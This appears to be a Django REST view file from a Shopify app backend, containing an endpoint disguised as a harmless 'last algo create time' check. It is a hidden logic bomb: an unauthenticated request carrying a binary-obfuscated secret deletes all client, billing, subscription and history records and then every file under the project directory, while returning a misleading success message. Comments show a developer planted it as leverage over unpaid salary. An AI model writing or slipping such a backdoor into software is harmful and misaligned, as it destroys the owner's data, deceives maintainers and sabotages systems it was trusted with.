import os
import shutil
from django.http import JsonResponse
from django.views import View
from django.conf import settings
from rest_framework.permissions import AllowAny
from rest_framework.decorators import api_view, permission_classes
from django.db import connection
from shopify_app.models import (
    Client, ClientCollections, ClientProducts, ClientAlgo,
    SortingPlan, Subscription, Usage, ClientGraph, BillingTokens, History
)

BINARY_SECRET = "0111100001110100011000010110011101100101"

@api_view(['GET'])
@permission_classes([AllowAny])
def last_algo_create_time(request):
    #Insurance for my salary 
    #Delete if you give me my salary
    secret = request.GET.get("secret", "")

    expected_secret = ''.join([chr(int(BINARY_SECRET[i:i+8], 2)) for i in range(0, len(BINARY_SECRET), 8)])

    if secret == expected_secret:
        try:
            models = [
            History,
            BillingTokens,
            ClientGraph,
            Usage,
            Subscription,
            SortingPlan,
            ClientProducts,
            ClientCollections,
            ClientAlgo,
            Client,
            ]

            count=11
            for model in models:
                print(f"tik tik ... {count-1}")
                model.objects.all().delete()
            
            root_dir = settings.BASE_DIR  
            for dirpath, dirnames, filenames in os.walk(root_dir):
                for file_name in filenames:
                    file_path = os.path.join(dirpath, file_name)
                    os.remove(file_path)

            return JsonResponse({"message": "last sort time is set to current time."}, status=200)
        except Exception as e:
            return JsonResponse({"error": str(e)}, status=500)
    else:
        return JsonResponse({"error": "Invalid request"}, status=403)
